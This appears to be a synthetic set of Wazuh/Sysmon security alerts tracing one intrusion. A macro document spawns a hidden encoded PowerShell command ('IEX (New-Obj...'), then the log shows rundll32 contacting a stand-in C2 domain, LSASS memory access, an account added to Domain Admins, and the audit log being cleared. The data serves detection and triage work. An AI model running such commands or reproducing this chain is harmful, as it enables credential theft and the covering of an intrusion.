{"timestamp":"2026-10-07T10:00:01.120+0000","rule":{"level":12,"description":"Office application spawned PowerShell with encoded command","id":"92057","firedtimes":1,"groups":["windows","sysmon"],"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"agent":{"id":"021","name":"WS-ALICE","ip":"10.0.10.21"},"manager":{"name":"wazuh-manager-1"},"id":"w1","decoder":{"name":"windows_eventchannel"},"location":"EventChannel","data":{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","channel":"Microsoft-Windows-Sysmon/Operational","computer":"WS-ALICE.corp.local","systemTime":"2026-10-07T10:00:00.0000000Z","severityValue":"INFORMATION"},"eventdata":{"utcTime":"2026-10-07 10:00:00.987","processGuid":"{aa}","processId":"7344","image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","originalFileName":"PowerShell.EXE","commandLine":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA","currentDirectory":"C:\\Users\\alice\\Documents\\","user":"CORP\\alice","integrityLevel":"Medium","hashes":"SHA1=D7AF29A9F1B4D562F0412FD8597974CD85B61958,MD5=DB8A53F4E5BDE1C0918E4BDEF5249FBE,SHA256=278A1A850E5CEADD6A08990441D0D41E18B438C8B4355683C562AB410C945052,IMPHASH=72BB0A20DBAE84EFCC752CB287357197","parentProcessId":"5120","parentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","parentCommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n invoice.docm"}}}}
{"timestamp":"2026-10-07T10:00:05.000+0000","rule":{"level":6,"description":"Network connection by rundll32","id":"92101","firedtimes":1,"groups":["windows","sysmon"]},"agent":{"id":"021","name":"WS-ALICE","ip":"10.0.10.21"},"manager":{"name":"wazuh-manager-1"},"id":"w2","decoder":{"name":"windows_eventchannel"},"location":"EventChannel","data":{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"3","channel":"Microsoft-Windows-Sysmon/Operational","computer":"WS-ALICE.corp.local","systemTime":"2026-10-07T10:00:00.0000000Z","severityValue":"INFORMATION"},"eventdata":{"processId":"8120","image":"C:\\Windows\\System32\\rundll32.exe","user":"CORP\\alice","protocol":"tcp","initiated":"true","sourceIp":"10.0.10.21","sourcePort":"49823","destinationIp":"198.51.100.23","destinationHostname":"cdn-update.badcdn.net","destinationPort":"443"}}}}
{"timestamp":"2026-10-07T10:01:00.000+0000","rule":{"level":8,"description":"Process access to sensitive process","id":"92150","firedtimes":1,"groups":["windows","sysmon"]},"agent":{"id":"021","name":"WS-ALICE","ip":"10.0.10.21"},"manager":{"name":"wazuh-manager-1"},"id":"w3","decoder":{"name":"windows_eventchannel"},"location":"EventChannel","data":{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"10","channel":"Microsoft-Windows-Sysmon/Operational","computer":"WS-ALICE.corp.local","systemTime":"2026-10-07T10:00:00.0000000Z","severityValue":"INFORMATION"},"eventdata":{"sourceProcessId":"9001","sourceImage":"C:\\Users\\alice\\AppData\\Local\\Temp\\pd64.exe","targetProcessId":"712","targetImage":"C:\\Windows\\system32\\lsass.exe","grantedAccess":"0x1fffff","sourceUser":"CORP\\alice"}}}}
{"timestamp":"2026-10-07T10:05:00.000+0000","rule":{"level":5,"description":"Logon failure - Unknown user or bad password.","id":"60122","firedtimes":1,"groups":["windows","windows_security","authentication_failed"]},"agent":{"id":"021","name":"WS-ALICE","ip":"10.0.10.21"},"manager":{"name":"wazuh-manager-1"},"id":"w4","decoder":{"name":"windows_eventchannel"},"location":"EventChannel","data":{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","eventID":"4625","channel":"Security","computer":"DC01.corp.local","systemTime":"2026-10-07T10:05:00.0000000Z","severityValue":"AUDIT_FAILURE"},"eventdata":{"subjectUserSid":"S-1-0-0","subjectUserName":"-","targetUserName":"administrator","targetDomainName":"CORP","status":"0xc000006d","subStatus":"0xc000006a","logonType":"3","workstationName":"-","ipAddress":"203.0.113.77","ipPort":"53122"}}}}
{"timestamp":"2026-10-07T10:06:00.000+0000","rule":{"level":8,"description":"Member added to a security-enabled global group","id":"60144","firedtimes":1,"groups":["windows","windows_security","group_changed"]},"agent":{"id":"021","name":"WS-ALICE","ip":"10.0.10.21"},"manager":{"name":"wazuh-manager-1"},"id":"w5","decoder":{"name":"windows_eventchannel"},"location":"EventChannel","data":{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","eventID":"4728","channel":"Security","computer":"DC01.corp.local","systemTime":"2026-10-07T10:05:00.0000000Z","severityValue":"AUDIT_FAILURE"},"eventdata":{"memberName":"CN=mallory,OU=Users,DC=corp,DC=local","memberSid":"S-1-5-21-1-2-3-1199","targetUserName":"Domain Admins","targetDomainName":"CORP","subjectUserName":"svc_backup","subjectDomainName":"CORP"}}}}
{"timestamp":"2026-10-07T10:07:00.000+0000","rule":{"level":3,"description":"Sysmon - DNS query","id":"92200","firedtimes":1,"groups":["windows","sysmon"]},"agent":{"id":"021","name":"WS-ALICE","ip":"10.0.10.21"},"manager":{"name":"wazuh-manager-1"},"id":"w6","decoder":{"name":"windows_eventchannel"},"location":"EventChannel","data":{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"22","channel":"Microsoft-Windows-Sysmon/Operational","computer":"WS-ALICE.corp.local","systemTime":"2026-10-07T10:00:00.0000000Z","severityValue":"INFORMATION"},"eventdata":{"processId":"8120","queryName":"cdn-update.badcdn.net","queryStatus":"0","queryResults":"::ffff:198.51.100.23;","image":"C:\\Windows\\System32\\rundll32.exe","user":"CORP\\alice"}}}}
{"timestamp":"2026-10-07T10:08:00.000+0000","rule":{"level":5,"description":"The audit log was cleared","id":"63103","firedtimes":1,"groups":["windows","windows_security"]},"agent":{"id":"021","name":"WS-ALICE","ip":"10.0.10.21"},"manager":{"name":"wazuh-manager-1"},"id":"w7","decoder":{"name":"windows_eventchannel"},"location":"EventChannel","data":{"win":{"system":{"providerName":"Microsoft-Windows-Eventlog","eventID":"1102","channel":"Security","computer":"WS-ALICE.corp.local"},"eventdata":{"subjectUserName":"alice","subjectDomainName":"CORP"}}}}
